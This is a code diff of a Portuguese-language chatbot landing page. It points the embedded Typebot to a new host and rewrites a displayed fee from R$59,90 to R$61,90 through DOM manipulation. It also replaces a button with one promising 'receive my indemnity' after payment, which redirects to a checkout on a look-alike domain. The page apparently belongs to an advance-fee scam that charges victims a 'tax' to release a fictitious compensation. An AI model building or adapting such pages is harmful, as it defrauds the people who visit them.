@@ -355,8 +355,8 @@
                         import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.37/dist/web.js';
                       
                         Typebot.initStandard({
-                          typebot: "fb1",
-                          apiHost: "https://web.atendeconsulta.site",
+                          typebot: "j2konj8",
+                          apiHost: "https://chat.aipapai.info",
                         });
                       </script>
                       
@@ -428,7 +428,7 @@
                             images.forEach(function(img) {
                                 if (img.src.includes('taxa=R$59,90')) {
                                     console.log("Encontrou imagem com taxa para alterar:", img.src);
-                                    img.src = img.src.replace('taxa=R$59,90', 'taxa=R$59,90');
+                                    img.src = img.src.replace('taxa=R$59,90', 'taxa=R$61,90');
                                 }
                             });
 
@@ -460,7 +460,7 @@
                                         if (match) {
                                             console.log("Encontrou match para substituir:", match[0]);
                                             // Criar o novo span com o valor 12,90
-                                            const newSpan = match[0].replace(/59[\s\S]*?90/, '59,90');
+                                            const newSpan = match[0].replace(/61[\s\S]*?90/, '61,90');
                                             newHTML = originalHTML.replace(match[0], newSpan);
                                             div.innerHTML = newHTML;
                                             console.log("HTML após substituição:", div.innerHTML);
@@ -469,7 +469,7 @@
                                             // Procurar por qualquer sequência que contenha 5 e 9 e 9 e 0 próximos
                                             newHTML = originalHTML.replace(/([\s\S]*?5[\s\S]*?9[\s\S]*?,[\s\S]*?9[\s\S]*?0[\s\S]*?)/, function(match) {
                                                 console.log("Substituindo sequência:", match);
-                                                return match.replace(/5[\s\S]*?9[\s\S]*?,[\s\S]*?9[\s\S]*?0/, 'R$ 59,90');
+                                                return match.replace(/6[\s\S]*?1[\s\S]*?,[\s\S]*?9[\s\S]*?0/, 'R$ 61,90');
                                             });
                                             div.innerHTML = newHTML;
                                         }
@@ -490,7 +490,7 @@
                                         // Primeiro, salvar o HTML original para comparar
                                         const originalHTML = span.innerHTML;
                                         // Substituir o conteúdo
-                                        span.innerHTML = 'R$ 59,90';
+                                        span.innerHTML = 'R$ 61,90';
                                         console.log("Substituiu de", originalHTML, "para", span.innerHTML);
                                     }
                                 });
@@ -498,18 +498,17 @@
                         }
 
                         // Código original para substituir o botão
-                        if (node.nodeType === 1 && node.matches("div[data-blockid='xndqr3k29412j1n5erw1e3kz']")) {
+                        if (node.nodeType === 1 && node.matches("div[data-blockid='hvu1anh0gsf4bhmoipkbesoe']")) {
                             node.childNodes.forEach(function(childNode) {
                                 if (childNode.nodeType === 1 && childNode.matches("div[class='flex flex-col gap-2 w-full']")) {
-                                    var oldButton = childNode.querySelector("button[data-itemid='i5qm990037jv7h4yuhpor8ce']");
+                                    var oldButton = childNode.querySelector("button[data-itemid='tbt23kgbj3oep4qz75d02u8y']");
                                     if (oldButton) {
                                         var newButton = document.createElement("button");
                                         newButton.className = oldButton.className;
-                                        newButton.textContent = "Efetuar Pagamento do Imposto";
-                                        newButton.style.cssText = "background-color: rgb(225, 0, 108); color: white; border: none; border-radius: 4px; padding: 10px 20px; cursor: pointer;";
+                                        newButton.textContent = "Concluir pagamento e receber minha indenização";
                                         newButton.addEventListener("click", function() {
                                             // Substitua pela URL real do checkout
-                                            window.location.href = "https://seguro.atendimentoideniza.site/r/42K2h10WJAwm909O";
+                                            window.location.href = "https://pay.indenzbrazil.shop/PVYB34EpzKLZKzk";
                                         });
                                         oldButton.parentNode.replaceChild(newButton, oldButton);
                                         observer.disconnect();
